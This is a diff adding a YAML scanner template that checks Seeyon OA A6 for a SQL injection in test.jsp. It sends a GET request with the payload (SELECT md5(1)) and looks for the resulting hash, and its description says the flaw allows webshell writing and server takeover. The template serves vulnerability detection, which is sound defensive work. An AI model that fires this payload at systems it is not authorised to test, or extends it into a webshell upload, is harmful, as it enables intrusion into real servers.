@@ -1,0 +1,18 @@
+name: Seeyon_OA_A6_test.jsp_SQL_injection
+transport: http
+set: {}
+detail:
+  dock: app="Yonyou-Seeyon-OA"
+  product: 'Seeyon OA A6 '
+  homepage: https://www.seeyon.com/
+  impact: <p>Controlling the server by injecting and writing webshell files<br></p>
+  description: Seeyon OA A6  test.jsp There is a SQL injection vulnerability, and
+    the server can be controlled by injecting and writing webshell files
+rules:
+  r1:
+    method: GET
+    path: /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))
+    follow_redirects: true
+    headers: {}
+    expression: response.status == 200 && response.body.bcontains(b'c4ca4238a0b923820dcc509a6f75849b')
+expression: r1()
